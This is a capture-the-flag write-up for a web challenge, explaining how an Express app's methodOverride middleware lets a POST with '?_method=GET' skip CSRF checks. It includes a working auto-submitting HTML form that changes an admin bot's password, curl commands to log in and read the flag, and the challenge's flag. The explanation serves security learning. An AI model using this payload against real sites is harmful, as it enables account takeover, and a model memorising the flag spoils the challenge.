# Get The Flag

**Category:** Web Exploitation

## Challenge Description

The goal of this challenge is simple: obtain the flag exposed by the `/flag` endpoint.

According to the challenge description:

> get the flag and submit it, Did people forget how to submit flags!?

The application only reveals the flag to users with the **admin** role.

---

## Recon

The application is written using Express.js.

The flag endpoint is implemented as:

```javascript
app.get("/flag", requireLogin, (req, res) => {
    const user = findUserById(req.session.userId);

    if (!user || user.role !== "admin") {
        return res.status(403).render("flag", { flag: null });
    }

    res.render("flag", { flag: FLAG });
});
```

Only authenticated users whose role is `admin` can access the flag.

---

## Initial Analysis

Attempting to brute-force the administrator account is infeasible because the password is randomly generated at startup:

```javascript
const ADMIN_PASSWORD = crypto.randomBytes(32).toString("hex");
```

Instead, another way to obtain an authenticated admin session must be found.

---

## User-Controlled HTML Upload

The application allows authenticated users to upload arbitrary HTML pages.

Relevant code:

```javascript
fs.writeFileSync(
    path.join(PAGES_DIR, filename),
    html
);
```

Uploaded pages are stored on the server and can later be visited.

---

## Admin Report Bot

The application also provides a report feature.

When a report is submitted, an administrator bot automatically visits the supplied page.

```javascript
await page.goto(`${APP_URL}${pagePath}`);
```

This means any uploaded HTML page is rendered inside the administrator's authenticated browser session.

This immediately suggests a client-side attack such as CSRF.

---

## Finding the Vulnerability

The password change endpoint is implemented as:

```javascript
app.all(
    "/account/change-password",
    requireLogin,
    csrfOnPostOnly,
    ...
);
```

The CSRF middleware only validates POST requests:

```javascript
if (req.method !== "POST") {
    return next();
}
```

However, the application also enables Express's `methodOverride()` middleware before this check.

As a result, sending:

```text
POST /account/change-password?_method=GET
```

causes Express to interpret the request as:

```text
GET /account/change-password
```

Since the middleware now sees a GET request, the CSRF validation is skipped.

Importantly, the original POST body is still available, so the password-changing logic continues to process the submitted form.

This creates a CSRF bypass.

---

## Exploitation

An HTML page is uploaded containing an auto-submitting form:

```html
<form id="f"
      method="POST"
      action="/account/change-password?_method=GET">

    <input name="password" value="hacked12345">
    <input name="confirm" value="hacked12345">
</form>

<script>
document.getElementById("f").submit();
</script>
```

When the administrator bot visits the page:

1. The browser automatically submits the form.
2. `methodOverride()` converts the request into a GET request.
3. CSRF validation is skipped.
4. The administrator password is successfully changed to:

```text
hacked12345
```

---

## Logging in as Administrator

After changing the password, login becomes straightforward.

```bash
curl -i -c admin.txt \
    -X POST \
    -d "username=admin&password=hacked12345" \
    https://target/login
```

The administrator session cookie is stored in `admin.txt`.

---

## Retrieving the Flag

With the authenticated administrator session:

```bash
curl -s \
    -b admin.txt \
    https://target/flag
```

The server responds with:

```text
L3AK{me7hoD_oVerRiDe_Csrf_Byp45s_6o_brrrr}
```

---

## Exploit Flow

1. Discover the administrator-only `/flag` endpoint.
2. Find the HTML upload functionality.
3. Observe that the administrator bot automatically visits uploaded pages.
4. Identify a CSRF bypass caused by `methodOverride()`.
5. Upload a malicious HTML page containing an auto-submitting form.
6. Force the administrator to change their own password.
7. Login using the new administrator password.
8. Access `/flag` and retrieve the flag.

---

## Flag

```text
L3AK{me7hoD_oVerRiDe_Csrf_Byp45s_6o_brrrr}
```
